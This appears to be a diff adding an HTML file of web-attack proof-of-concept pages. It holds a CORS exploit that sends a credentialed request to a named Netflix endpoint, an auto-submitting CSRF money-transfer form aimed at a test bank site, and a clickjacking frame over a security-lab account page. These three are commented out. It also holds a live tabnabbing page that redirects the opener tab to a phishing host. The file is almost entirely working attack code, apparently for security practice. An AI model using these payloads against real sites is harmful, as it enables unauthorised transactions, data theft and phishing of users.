@@ -1,0 +1,86 @@
+<!-- <html>
+   <head>
+      <script>
+         function cors() {
+            var xhttp = new XMLHttpRequest();
+                xhttp.onreadystatechange = function() {
+                    if (this.readyState == 4 && this.status == 200) {
+                        document.getElementById("demo").innerHTML = alert(this.responseText);
+            }
+         };
+         xhttp.open("POST", "www.netflix.com/personalization/cl2", true);
+         xhttp.withCredentials = true;
+         xhttp.send();
+         }
+      </script>
+   </head>
+   <body>
+      <center>
+      <h2>CORS PoC Exploit </h2>
+      <h3>created by <a href="https://instagram.com/shathish_surya?igshid=1sneqkpw4fplj">@shathish_surya</a></h3>
+      <h3>Show full content of page</h3>
+      <div id="demo">
+         <button type="button" onclick="cors()">Exploit</button>
+      </div>
+   </body>
+</html> -->
+
+<!-- <html>
+    <body>
+        <iframe style="display:none" id="csrf-frame"></iframe>
+        <form action="http://demo.testfire.net/bank/doTransfer" method="post" id="csrf-form" target="csrf-frame" >
+            <input type="hidden" name="fromAccount" value="800002">
+            <input type="hidden" name="toAccount" value="800001">
+            <input type="hidden" name="transferAmount" value="221222">
+            <input type="hidden" name="transfer" value="Transfer+Money">
+        </form>
+        <script>document.getElementById("csrf-form").submit()</script>
+    </body>
+</html> -->
+
+<!-- <!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>Document</title>
+</head>
+<body>
+   <style>
+      iframe{
+         position: relative;
+         width: 1000px;
+         height: 700px;
+         opacity: 0.1;
+         z-index: 2;
+      }
+      .abc{
+         position: absolute;
+         top: 500px;
+         left: 100px;
+         z-index: 1;
+      }
+   </style>
+   <input class="abc" type="button" value="Click Me">
+   <iframe src="https://0a4800a103b441b1c01defde00b500f3.web-security-academy.net/my-account"></iframe>
+   
+</body>
+</html> -->
+
+<!-- TABNABBING POC -->
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+   <meta charset="UTF-8">
+   <meta http-equiv="X-UA-Compatible" content="IE=edge">
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+   <title>TABNABBING</title>
+</head>
+<body>
+   <script>console.log(window.opener.location.replace("https://phishingsite.com"))</script>
+
+   <script>console.log(window.opener)</script>
+</body>
+</html>
